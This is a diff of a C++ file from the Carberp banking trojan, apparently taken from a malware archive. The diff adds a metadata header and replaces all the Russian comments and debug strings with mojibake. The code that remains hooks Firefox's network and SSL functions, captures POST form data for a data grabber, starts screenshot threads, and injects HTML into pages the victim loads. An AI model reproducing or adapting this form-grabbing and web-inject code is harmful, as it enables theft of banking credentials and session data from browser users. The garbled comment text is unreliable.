@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include <nss/ssl.h>
@@ -27,25 +38,25 @@
 
 //#include "BotDebug.h"
 
-// Зарезервируем имя для объявления функций nspr4 апи
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ nspr4 пїЅпїЅпїЅ
 #define NSPRAPI
 
 
-// Для избежания затрат процесорного времени при поиске функций в загруженных
-// библиотеках кешируем найденные результаты
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 const DWORD ApiCasheSize = 6;
 LPVOID ApiCashe[ApiCasheSize] = {NULL};
 
 bool InitMozillaApiCashe()
 {
-	// Инициализировать кэш апи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ
 	m_memset(&ApiCashe, 0, ApiCasheSize * sizeof(DWORD));
 	return true;
 }
 
-/* Шаблоны для доступа к API */
+/* пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ API */
 
-// Шаблон для инициализации функций без параметров
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 template <DWORD ApiIndex, DWORD h, DWORD hash>
 inline LPVOID pushargEx2()
 {
@@ -59,7 +70,7 @@ inline LPVOID pushargEx2()
 	return func();
 }
 
-// Шаблон для инициализации функций с одним параметром
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 template <DWORD ApiIndex, DWORD h, DWORD hash, class A>
 inline LPVOID pushargEx2(A a1)
 {
@@ -73,7 +84,7 @@ inline LPVOID pushargEx2(A a1)
 	return func(a1);
 }
 
-// Шаблон для инициализации функций с двумя парaметрами
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅaпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B>
 inline LPVOID pushargEx2(A a1, B b1)
 {
@@ -87,7 +98,7 @@ inline LPVOID pushargEx2(A a1, B b1)
 	return func(a1, b1);
 }
 
-// Шаблон для инициализации функций с тремя парaметрами
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅaпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B, class C>
 inline LPVOID pushargEx2(A a1, B b1, C c1)
 {
@@ -101,7 +112,7 @@ inline LPVOID pushargEx2(A a1, B b1, C c1)
 	return func(a1, b1, c1);
 }
 
-// Шаблон для инициализации функций с пятью парaметрами
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅaпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 template <DWORD ApiIndex, DWORD h, DWORD hash, class A, class B, class C, class D, class E>
 inline LPVOID pushargEx2(A a1, B b1, C c1, D d1, E e1)
 {
@@ -115,7 +126,7 @@ inline LPVOID pushargEx2(A a1, B b1, C c1, D d1, E e1)
 	return func(a1, b1, c1, d1, e1);
 }
 
-// Описываем функции для работы с библиотекой NSPR4;
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ NSPR4;
 #define pPR_GetError				pushargEx2<0, 10, 0x1D3347F>
 #define pPR_MillisecondsToInterval	pushargEx2<1, 10, 0x5BF9111>
 #define pPR_Poll					pushargEx2<2, 10, 0xFA1AB4F9>
@@ -129,7 +140,7 @@ inline LPVOID pushargEx2(A a1, B b1, C c1, D d1, E e1)
 //#define pPR_GetConnectStatus		pushargEx<10,0xA4989C58>
 
 
-// Шаблон вывода отладочного сообщения FireFox
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ FireFox
 template <class REQUEST, class DATA, class STR_>
 void FFBG_Template(REQUEST Request, DATA Data, STR_ Str)
 {
@@ -164,7 +175,7 @@ void FFBG_Template(REQUEST Request, DATA Data, STR_ Str, ARG1 Arg, ARG2 Arg2)
 
 
 
-/* Описания констант */
+/* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */
 char HeaderContentLength[] = {'c','o','n','t','e','n','t','-','l','e','n','g','t','h',':',' ',0};
 
 
@@ -183,7 +194,7 @@ PSSLIMPORTFD SSL_ImportFDReal;
 PROpenTCPSocket PR_OpenTCPSocketReal;
 
 
-//     Глобальные данные
+//     пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 PList HashList = NULL;
 PCHAR FFUserAgent;
 PRequestList FFRequests = NULL;
@@ -221,10 +232,10 @@ namespace FFUtils
 
 	bool CheckDocumentCompleted(PRequest Request)
 	{
-		// Функция проверяет возвращает истину если документ полностью загружен
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Request->FileReaded) return true;
 
-		// Проверяем длину загруженных данных.
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 		if (Request->ContentLength != 0)
 		{
 //			DWORD Size = MEMBLOCK::Size(Request->ReceiveList);
@@ -237,54 +248,54 @@ namespace FFUtils
 	//---------------------------------------------------------------------------
 	bool ProcessResponseHeaders(PRequest Request)
 	{
-		// Функция обрабатывает загруженный заголовок
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 		PMemBlock Block = MEMBLOCK::Pack(Request->ReceiveList);
 		if (Block == NULL || Block->Size == 0) return false;
 
 		PCHAR Buf = (PCHAR)Block->Data;
-		// Определяем размер заголовка
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		int HeadSize = STR::Pos(Buf, LineBreak2, Block->Size);
 		if (HeadSize < 0) return false;
 
 
 		#ifdef DebugUtils
 			PCHAR Tmp = STR::New(Buf, HeadSize);
-			FFDBG(Request, Tmp, "Обрабатываем ответ сервера:");
+			FFDBG(Request, Tmp, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ:");
             STR::Free(Tmp);
 		#endif
 
 		HeadSize += 4;
         Request->HeaderSize = HeadSize;
 
-		// Проверяем тип контекста
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		#ifdef HTMLInjectsH
 			Request->ContentType = HTTPParser::GetHeaderValue(Buf, ParamContentType);
-			FFDBG(Request, NULL, "--- Тип документа [%s]", Request->ContentType);
+			FFDBG(Request, NULL, "--- пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ [%s]", Request->ContentType);
 
 			bool Support = HTMLInjects::SupportContentType(Request->ContentType);
 			if (!Support)
 			{
-				FFDBG(Request, NULL, "---err Данный тип документов не поддерживается");
+				FFDBG(Request, NULL, "---err пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 				Request->IsInject = false;
 				return true;
 			}
 		#endif
 
-		// Определяем длину контента
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR CL = HTTPParser::GetHeaderValue(Buf, ParamContentLength);
 		if (CL != NULL)
 		{
 			Request->ContentLength = StrToInt(CL);
 			if (Request->ContentLength == 0)
 				Request->IsInject = false;
-			FFDBG(Request, NULL, "--- Размер документа %d", Request->ContentLength);
+			FFDBG(Request, NULL, "--- пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d", Request->ContentLength);
 			STR::Free(CL);
 		}
 		else
-			FFDBG(Request, NULL, "---err Не указан размер документа");
+			FFDBG(Request, NULL, "---err пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
-		// Для инжекта допускаем только страницы с положительной длиной контента
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	//	if (Request->ContentLength == 0)
 	//		Request->IsInject = false;
 
@@ -295,36 +306,36 @@ namespace FFUtils
 
 	void UpdateContentLength(PRequest Request)
 	{
-		// Обновить длину контента
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR Buf = (PCHAR)Request->Buffer;
 
-		// Определяем позицию вставки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		int Pos = STR::Pos(Buf, ParamContentLength);
 		if (Pos < 0) return;
 		Pos += StrCalcLength(ParamContentLength);
 
-		// Определяем новый размер
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Request->ContentLength = StrCalcLength(Buf + Request->HeaderSize);
 
 		PCHAR BufEnd = Buf + (Request->HeaderSize + Request->ContentLength);
 
-		// Создаём строку
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR CLS = StrLongToString(Request->ContentLength);
 		PCHAR InLine = STR::New(2, ": ", CLS);
 		DWORD InLineLen = StrCalcLength(InLine);
 		STR::Free(CLS);
 
-		// Определяем указатели на копируемые блоки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		PCHAR AfterPtr = Buf + Pos;
 		while (*AfterPtr != 10 && *AfterPtr != 13) AfterPtr++;
 
-		// Определяем общий размер буфера
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD Len = Pos + InLineLen + (BufEnd - AfterPtr);
 
 		PCHAR NewBuf = (PCHAR)MemAlloc(Len + 1);
 		if (NewBuf == NULL) return;
 
-		// Копируем данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR Tmp = NewBuf;
 
 		m_memcpy(Tmp, Buf, Pos);
@@ -338,7 +349,7 @@ namespace FFUtils
 
 		*(NewBuf + Len) = 0;
 
-		// Устанавливаем новый буяер
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		Request::SetBuffer(Request, (LPBYTE)NewBuf, Len);
 	}
 	//----------------------------------------------------------------------------
@@ -349,15 +360,15 @@ namespace FFUtils
 #ifdef HTMLInjectsH
 	bool InjectFF(PRequest Request)
 	{
-		// Обрабатываем загруженные данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Request == NULL || !Request->IsInject)
 			return false;
 
-		FFDBG(Request, NULL, "+++++  Производим HTML инжекты");
+		FFDBG(Request, NULL, "+++++  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 		Request->Injected = true;
 
-		THTTPSessionInfo Session; // Описание сессии
+		THTTPSessionInfo Session; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 		Session.BrowserType = BROWSER_TYPE_FF;
 		Session.UserAgent = FFUserAgent;
@@ -367,7 +378,7 @@ namespace FFUtils
 		if (HTMLInjects::Execute(Request, &Session))
 		{
 			FFUtils::UpdateContentLength(Request);
-			FFDBG(Request, NULL, "+++++  В документ внесены изменения");
+			FFDBG(Request, NULL, "+++++  пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 			return true;
 		}
 
@@ -405,7 +416,7 @@ bool SubstituteHeader(char *Header)
 //----------------------------------------------------------------------------
 void UpdateFFUserAgent(PCHAR Request)
 {
-    // Получаем имя агента
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (FFUserAgent == NULL)
     	FFUserAgent = HTTPParser::GetHeaderValue(Request, ParamUserAgent);
 }
@@ -414,23 +425,23 @@ void UpdateFFUserAgent(PCHAR Request)
 
 bool ProcessPostData(PRequest Request)
 {
-	// Обработать POST данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// Проверяем библиотеку ScreenShot
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ScreenShot
 	if ( CalcHash(Request->Optional) == 0x24DE3210 )
 	{
-		FFDBG(Request, NULL, "Обрабатываем скриншоты");
+		FFDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		StartThread( ScreensThread, NULL );
 		return true;
 	}
 
-	// Проверяем не обрабатывали ли мы этот запрос
-	FFDBG(Request, NULL, "Получаем хэш");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	FFDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ");
 	DWORD DataHash = CalcHash(Request->Optional);
 	if (FindHash(DataHash))
 		return true;
 
-	FFDBG(Request, NULL, "Отправляем данные");
+	FFDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	DataGrabber::AddHTMLFormData(Request->URL, Request->Optional, FFUserAgent, BROWSER_TYPE_FF, DATA_TYPE_FORM);
 
@@ -444,7 +455,7 @@ bool ProcessPostData(PRequest Request)
 bool MakeInfo( PRequest Request, PCHAR buf, int len )
 {
 
-	// Собираем информацию об отправляемом запросе
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR MethodName;
 	PCHAR Path;
@@ -457,7 +468,7 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len )
 
 		UpdateFFUserAgent(buf);
 
-		// Разбираем тип запроса
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Request->Method = GetMethodFromStr(MethodName);
 		STR::Free(MethodName);
 
@@ -467,7 +478,7 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len )
 			return false;
 		}
 
-		// Собираем URL
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL
 		PCHAR Host = HTTPParser::GetHeaderValue(buf, ParamHost);
 		PCHAR Protocol = ProtocolHTTP;
 		PRFileDesc *FD = (PRFileDesc *)Request->Owner;
@@ -488,28 +499,28 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len )
 			return true;
 
 
-		// Подготавливаем запрос к перехвату пост данных
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Request->SupportPostData = true;
 
-		FFDBG(Request, Request->Optional, "Перехватываем POST данные");
+		FFDBG(Request, Request->Optional, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ");
 
 		if (STR::Pos(buf, LineBreak2, len) < 0)
 		{
-			FFDBG(Request, Request->Optional, "Запрос не содержит POST данные");
-			return false;  // В заголовке нет пост данных
+			FFDBG(Request, Request->Optional, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ");
+			return false;  // пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		}
 
 
 
 
-		// Проверяем тип контента
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR CT = HTTPParser::GetHeaderValue(buf, ParamContentType);
 		DWORD Hash = CalcHash(CT);
 		FFDBG(Request, Request->Optional, "Content-Type: %s", CT);
 		STR::Free(CT);
 		if (Hash != ConentTypeHash) /* url_encoded*/
 		{
-			FFDBG(Request, Request->Optional, "Тип данных не поддерживается", CT);
+			FFDBG(Request, Request->Optional, "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", CT);
 			Request->SupportPostData = false;
 			return true;
 		}
@@ -519,13 +530,13 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len )
 		Request->Optional = GetURLEncodedPostData(buf);
 
 		#ifndef BV_APP
-		FFDBG(Request, NULL, "POST данные: \r\n\r\n %s \r\n\r\n", Request->Optional);
+		FFDBG(Request, NULL, "POST пїЅпїЅпїЅпїЅпїЅпїЅ: \r\n\r\n %s \r\n\r\n", Request->Optional);
 		#endif
 
 
 		if (Request->Optional != NULL)
 		{
-			// запрос содержит пост данные, обрабатываем их
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
 			ProcessPostData(Request);
 		}
 		return true;
@@ -533,11 +544,11 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len )
 	else
 	if (Request->Method == hmPOST && Request->SupportPostData)
 	{
-		// Проверяем POST данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ
 
-		bool RequestEnd = STR::Pos(buf, LineBreak2) >= 0; // Признак наличия окончания запроса
+		bool RequestEnd = STR::Pos(buf, LineBreak2) >= 0; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-        // Проверяем тип контента
+        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR CT = HTTPParser::GetHeaderValue(buf, ParamContentType);
 		if (CT != NULL)
 		{
@@ -558,9 +569,9 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len )
 		}
 		else
 		{
-			// Наличие признака окончания запроса означает, что браузер
-			// полностью вызал заголовок и следующей записью будут
-			// выданы пост данные
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if (RequestEnd)
 				Request->Flags = 1;
         }
@@ -572,7 +583,7 @@ bool MakeInfo( PRequest Request, PCHAR buf, int len )
 /*
 bool WaitPool(PRFileDesc *FD)
 {
-	// Функция будет ожидать пока производится запись в пул
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ
 	bool Result = false;
 	PRInt32 npoll;
 	PRIntervalTime delay = (PRIntervalTime)pPR_MillisecondsToInterval(50);
@@ -605,13 +616,13 @@ bool WaitPool(PRFileDesc *FD)
 
 DWORD ReadSocketData(PRequest Request, LPVOID Buf, int BufSize)
 {
-	// Читаем данные из сокета
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Request->FileReaded) return 0;
 
 	if (!Request->FileReaded && Request->ReceiveList == NULL)
 	{
 		Request::InitializeReceiveData(Request);
-		FFDBG(Request, NULL, "Начало чтения данных");
+		FFDBG(Request, NULL, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
     }
 
 	PMemBlockList List = Request->ReceiveList;
@@ -622,21 +633,21 @@ DWORD ReadSocketData(PRequest Request, LPVOID Buf, int BufSize)
 
 	do
 	{
-		// Читаем следующую порцию данных
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		//Bytes = (PRInt32)PR_ReadReal(FD, Request->ReceiveBuf->Data, Request->ReceiveBuf->Size);
 		Bytes = (PRInt32)PR_ReadReal(FD, Buf, BufSize);
 
 		if (Bytes <= 0) break;
 
-		// Успешно прочитали порцию данных
-		FFDBG(Request, NULL, "---> Прочитано %d байт", Bytes);
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		FFDBG(Request, NULL, "---> пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d пїЅпїЅпїЅпїЅ", Bytes);
 		Readed += Bytes;
 		Request->ReadedSize += Bytes;
 
 		//MEMBLOCK::AddBlock(List, Request->ReceiveBuf->Data, Bytes);
 		MEMBLOCK::AddBlock(List, Buf, Bytes);
 
-		// Обрабатываем заголовок ответа сервера
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (!Request->HeaderHandled)
 		{
